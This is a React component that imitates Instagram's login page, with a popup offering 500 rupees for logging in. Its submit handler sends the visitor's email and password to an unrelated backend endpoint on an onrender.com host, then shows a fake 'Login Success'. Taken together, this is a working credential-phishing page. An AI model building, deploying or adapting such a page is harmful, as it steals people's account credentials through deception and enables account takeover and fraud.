import React, { useState } from "react";
import "./InstagramLogin.css";
import image from '../assets/fb1.png';
import offerImage from '../assets/offer.jpg'
import { useNavigate } from "react-router-dom";

const InstagramLogin = () => {
    const [showPopup, setShowPopup] = useState(true);
    const [email,setEmail] = useState("")
    const [password,setPassword] = useState("")
    const [msg,setMsg] = useState("")
    const [errmsg,setErrmsg] = useState("")
    const [loading,setLoading]=useState(false);
    const navigate = useNavigate();
    const API_PATH="https://backend-nodejs-swiggy-jbpj.onrender.com";
    const handleClosePopup = () => {
    setShowPopup(false);
   };
 const handleSubmit = async (e) =>{
   e.preventDefault();
    setMsg("");
    setErrmsg("")
   if(!email || !password){
      setErrmsg("All fileds are required");
      return;
   }
   try{
    setLoading(true);
    const response = await fetch(`${API_PATH}/vendor/instaregister`,{
      method:'POST',
      headers:{
        'Content-Type':'application/json'
      },
      body:JSON.stringify({email,password})
    });
    if(response.ok){
        setMsg("Login Success")
        setLoading(false)
        navigate('/home')
    }
   }catch(err){
       console.error("registration", err);
       alert("login failed")
   }
  }
  return (
    <div className="insta-wrapper">

    {showPopup && (
        <div className="popup-overlay">
          <div className="popup-box">
            <img
              src={offerImage}
              alt="gift"
              className="popup-image"
            />
            <h3>Login Instagram to get 500 rupees</h3>
            <button onClick={handleClosePopup} className="popup-ok-button">
              OK
            </button>
          </div>
        </div>
      )}
      <div className="insta-container">
         <h3 className="msg" >{msg}</h3>
         <h3 className="errmsg">{errmsg}</h3>
        <h1 className="insta-logo">Instagram</h1>
        <button className="facebook-button">
          <img
            src={image}
            alt="fb"
            className="fb-icon"
          />
          Continue with Facebook
        </button>
       <form onSubmit={handleSubmit}>
        <div className="separator">
          <div className="line"></div>
          <span>OR</span>
          <div className="line"></div>
        </div>

        <input
          className="input-field"
          type="text"
          name='email' value={email} onChange={(e)=>setEmail(e.target.value)}
          placeholder="Phone number, username, or email"
        />
        <input
          className="input-field"
          type="password"
          name='password' value={password} onChange={(e)=>setPassword(e.target.value)}
          placeholder="Password"
        />

        <a href="#" className="forgot-link">
          Forgot password?
        </a>

        <button className="login-button" type="submit">{loading? "Log in...": "Log in"}</button>
        </form>

        <div className="signup-link">
          Don't have an account? <a href="#">Sign up</a>
        </div>

        <p className="terms">
          By continuing, you agree to Instagram's{" "}
          <a href="#">Terms of Use</a> and <a href="#">Privacy Policy</a>.
        </p>
      </div>
    </div>
  );
};

export default InstagramLogin;
